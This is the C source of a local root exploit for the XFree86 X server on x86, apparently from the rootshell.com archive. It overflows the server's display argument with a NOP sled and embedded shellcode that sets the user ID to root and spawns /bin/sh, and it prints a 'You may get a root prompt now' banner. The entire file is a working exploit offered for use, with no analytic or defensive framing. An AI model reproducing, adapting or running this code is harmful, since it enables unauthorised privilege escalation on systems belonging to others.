/* [ http://www.rootshell.com/ ] */
 
        /*  XFree86 Server exploit for Intel x86  */
        /*  Have phun!!                           */

/* Try 2 3 4 5 for OFFSET */
#define OFFSET 2

#include <string.h>
#include <unistd.h>
#include <errno.h>

#define LENCODE ( sizeof( Code ) )
char Code[] =
    "\xeb\x40\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0"
    "\x3f\x89\xc2\x31\xdb\xb3\x0a\x31\xc9\xcd\x80\x89\xd0\x43\x41"
    "\xcd\x80\x89\xd0\x43\x41\xcd\x80\x31\xc0\x89\xc3\xb0\x17\xcd"
    "\x80\x31\xc0\xb0\x2e\xcd\x80\x31\xc0\xb0\x0b\x89\xf3\x8d\x4e"
    "\x08\x8d\x56\x0c\xcd\x80\xe8\xbb\xff\xff\xff/bin/sh";

char Display[ 0x4001 + OFFSET ] = ":99999", *ptr = Display + OFFSET + 1;
char *args[] = { "X", "-nolock", Display, NULL };

main() {
  printf("pHEAR - XFree86 exploit\nby mAChnHEaD <quenelle@iname.com>\n\nYou may get a root prompt now. If you don't, try different values for OFFSET.\n\n");
  dup2( 0, 10 ); dup2( 1, 11 ); dup2( 2, 12 );
  __asm__("movl %%esp,(%0)\n\tsubl %1,(%0)"::"b"(ptr),"n"(LENCODE+0x2000));
  memcpy( ptr + 4, ptr, 0x3fc );
  memset( ptr + 0x400, 0x90, 0x3c00 - LENCODE );
  memcpy( ptr + 0x4000 - LENCODE, Code, LENCODE );
  execve( "/usr/X11R6/bin/X", args, args + 3 );
  perror( "execve" );
}
